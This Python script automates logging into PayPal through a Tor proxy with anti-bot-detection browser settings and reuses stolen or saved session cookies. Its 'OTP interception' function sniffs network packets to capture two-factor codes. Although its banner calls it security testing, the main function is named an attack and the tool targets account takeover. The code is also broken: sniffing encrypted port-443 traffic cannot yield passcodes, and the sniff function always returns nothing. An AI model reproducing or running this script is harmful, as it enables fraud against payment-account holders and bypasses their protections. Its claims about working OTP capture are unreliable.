import time
import random
import json
import imaplib
import email
from getpass import getpass
from email.header import decode_header
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from webdriver_manager.chrome import ChromeDriverManager
import undetected_chromedriver as uc
import scapy.all as scapy  # For network sniffing
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# ---------- CONFIGURATION ----------
SESSION_COOKIE_FILE = "paypal_cookies.json"  # Store session cookies
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
PROXY = "socks5://127.0.0.1:9050"  # Example proxy (Tor SOCKS5)

# ---------- LOAD & SAVE COOKIES ----------
def save_cookies(driver, filename):
    with open(filename, "w") as file:
        json.dump(driver.get_cookies(), file)

def load_cookies(driver, filename):
    try:
        with open(filename, "r") as file:
            cookies = json.load(file)
        for cookie in cookies:
            driver.add_cookie(cookie)
        driver.refresh()
    except FileNotFoundError:
        print("[!] No saved session found. Logging in manually.")

# ---------- STEALTH FUNCTIONS ----------
def stealth_delay():
    time.sleep(random.uniform(2, 5))

def configure_stealth_options():
    options = ChromeOptions()
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument(f"--user-agent={USER_AGENT}")
    options.add_argument(f"--proxy-server={PROXY}")
    return options

# ---------- NETWORK SNIFFING FOR OTP INTERCEPTION ----------
def sniff_otp():
    print("[*] Sniffing network for OTP...")
    def packet_callback(packet):
        if packet.haslayer(scapy.Raw):
            payload = packet[scapy.Raw].load.decode(errors='ignore')
            if "OTP" in payload or "code" in payload:
                print(f"[+] Captured OTP: {payload}")
                return payload
    
    scapy.sniff(filter="tcp port 80 or tcp port 443", prn=packet_callback, store=0)

# ---------- BROWSER AUTOMATION ATTACK ----------
def browser_automation_attack(email, password):
    options = configure_stealth_options()
    driver = uc.Chrome(options=options)
    driver.get("https://www.paypal.com/signin")
    stealth_delay()

    # Load cookies if available
    load_cookies(driver, SESSION_COOKIE_FILE)

    # Wait for the email input field to be available
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "login_email")))

    if "summary" in driver.current_url:
        print("[+] Session restored successfully!")
        return driver

    # Enter email
    email_input = driver.find_element(By.NAME, "login_email")
    email_input.send_keys(email)
    stealth_delay()

    # Wait for the 'Next' button to be clickable and click it
    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.ID, "btnNext")))
    next_button = driver.find_element(By.ID, "btnNext")
    next_button.click()
    stealth_delay()

    # Wait for the password input field to be available
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "login_password")))

    # Enter password and make it visible
    password_input = driver.find_element(By.NAME, "login_password")
    driver.execute_script("arguments[0].setAttribute('type', 'text')", password_input)  # Show password
    password_input.send_keys(password)
    stealth_delay()

    # Wait for the 'Login' button to be clickable and click it
    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.ID, "btnLogin")))
    login_button = driver.find_element(By.ID, "btnLogin")
    login_button.click()
    stealth_delay()

    # OTP Interception
    otp_code = sniff_otp()
    if otp_code:
        # Wait for the OTP input field to be available
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "otp")))
        otp_input = driver.find_element(By.NAME, "otp")
        otp_input.send_keys(otp_code)
        otp_input.send_keys(Keys.RETURN)
        stealth_delay()

    # Check if login was successful
    if "summary" in driver.current_url:
        print("[+] Login successful! Saving session cookies.")
        save_cookies(driver, SESSION_COOKIE_FILE)
    else:
        print("[-] Login failed.")

    return driver

# ---------- START SCRIPT ----------
def main():
    print("PayPal Security Testing Script")
    email = input("Enter PayPal email: ")
    password = getpass("Enter PayPal password (will be visible as you type): ")

    driver = browser_automation_attack(email, password)
    if driver:
        print("[*] Session is now active. Proceeding with automation.")
        driver.quit()

if __name__ == "__main__":
    main()
